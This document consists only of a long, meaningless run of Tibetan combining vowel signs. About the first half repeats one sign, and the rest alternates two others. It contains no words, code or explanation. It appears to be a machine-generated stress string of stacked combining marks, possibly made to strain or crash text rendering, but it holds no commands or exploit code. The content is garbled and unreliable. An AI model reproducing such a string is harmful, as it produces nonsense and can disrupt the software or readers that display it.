ཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀ